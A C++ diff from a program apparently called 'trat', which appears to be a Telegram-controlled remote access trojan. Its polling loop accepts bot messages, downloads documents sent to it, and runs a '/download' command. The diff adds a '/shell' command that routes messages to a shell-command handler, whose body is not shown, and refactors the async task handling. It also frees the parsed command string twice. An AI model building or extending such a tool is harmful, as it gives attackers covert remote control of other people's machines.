@@ -36,53 +36,54 @@ namespace trat
 
           if ((!message_document) && (!(this -> checkIfCommand(message_text)) ))
           { 
-            auto future = std::async(std::launch::async, [this]()
-            {
+            futures.push_back(std::async(std::launch::async, [this]() {
               this->sendMessage("This is not a valid command");
-            });
-            futures.push_back(std::move(future));
+            }));
           }
           if ( (message_document) && (!message_text) )
           {
-            auto future = std::async(std::launch::async, [this, message_document]()
-            {
+            futures.push_back(std::async(std::launch::async, [this, message_document]() {
               this -> sendMessage("Downloading document");
               this -> handleDocuments(message_document);
-            });
-            futures.push_back(std::move(future));
+            }));
           }
           else if ( (!message_document) && (message_text) )
           {
-            char* precieved_command = parser::getPrefixFromString(message_text, ' ');
+            char* precieved_command = parser::getPrefixFromString(message_text, " ");
             if ( strcmp(precieved_command, "/download") == 0 )
             {
-              auto future = std::async(std::launch::async, [this, message_text]()
-              {
+              futures.push_back(std::async(std::launch::async, [this, message_text]() {
                 this -> handleDownloadCommand(message_text);
-              });
+              }));
               parser::cleanString(precieved_command);
-              
-              futures.push_back(std::move(future));
+            }
+            else if( strcmp(precieved_command, "/shell") == 0)
+            {
+              futures.push_back(std::async(std::launch::async, [this, message_text]() {
+                this -> handleShellCommand(message_text);
+              }));
+              parser::cleanString(precieved_command);
             }
             parser::cleanString(precieved_command);
           }
           
           offset = update.update_id + 1;
-          std::this_thread::sleep_for(std::chrono::seconds(1));
         }
       }    
+
       auto it = futures.begin();
       while (it != futures.end()) 
       {
         if (it->wait_for(std::chrono::seconds(0)) == std::future_status::ready) 
         {
-          try { it->get();} 
+          try { it->get(); } 
           catch (const std::exception& e) { std::cerr << "Exception in asynchronous task: " << e.what() << '\n'; }
-        it = futures.erase(it);
-        } 
-        else{ ++it; }
+          it = futures.erase(it);
+        }  
+        else { ++it; }
       }
       telebot_put_updates(updates, count);
+      std::this_thread::sleep_for(std::chrono::seconds(1));
     }
   }
 }
